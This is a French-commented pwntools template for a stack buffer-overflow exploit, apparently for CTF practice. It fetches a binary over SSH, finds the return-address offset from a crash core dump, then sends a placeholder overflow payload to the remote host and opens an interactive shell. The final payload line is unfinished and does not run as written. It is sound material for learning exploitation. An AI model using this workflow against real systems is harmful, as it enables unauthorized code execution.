#!/bin/python3

# Template pour Linux
# Cas d'un binaire 64-bit à télécharger et à tester en local avant de reproduire à distance

from pwn import *

binary = './executable'
first_payload = cyclic(500, n=8)

# ========== Si fichier à distance ==========
remote_host='XXX'
login='XXX'
pwd='XXX'
remote_port=9999
 
ssh_connection = ssh(host=remote_host, user=login, password=pwd, port=remote_port)
ssh_connection.download_file(binary)
# =============================================

elf = ELF(binary)
elf.checksec(binary)
os.system('chmod +x ' + binary )

io = process(binary)
io.sendline(first_payload)
io.wait()

# Lecture du fichier core contenant une copie de la mémoire du programme au moment du crash
# Attention à WSL qui pose problème pour ça
core = io.corefile
RIP = cyclic_find(core.read(core.rsp, 8), n=8)
info("Offset de {} vers RIP".format(RIP))

# Exemple pour avoir l'adresse d'une fonction
main = elf.functions['main'].address
 
io = ssh_connection.process(binary)
final_payload = b'A'*1000 + 'XXX' + 'YYY'

io.sendline(final_payload)
io.interactive()
